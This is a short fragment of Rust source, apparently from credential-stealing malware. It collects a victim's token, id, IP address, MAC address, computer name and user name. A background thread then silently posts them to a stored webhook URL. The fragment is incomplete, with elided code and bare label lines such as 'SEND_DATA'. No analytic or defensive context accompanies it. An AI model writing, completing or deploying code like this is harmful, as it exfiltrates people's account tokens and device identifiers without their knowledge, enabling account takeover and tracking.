...
WEBHOOK_LINK_UTILS
    ...
    let id_clone = final_creds_clone.id.clone();
    let token_clone = final_creds_clone.token.clone();
    let ip_clone = final_creds_clone.ip.clone();
    let mac_clone = final_creds_clone.mac.clone();
    let pc_name_clone = final_creds_clone.pc_name.clone();
    let pc_user_clone = final_creds_clone.pc_user.clone();

    rayon::spawn(move || {
let _ = global::utils::send_data(&global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}NOP{:?},{:?},{:?},{:?}", token_clone, id_clone, ip_clone, mac_clone, pc_name_clone, pc_user_clone), "");
SEND_DATA
});
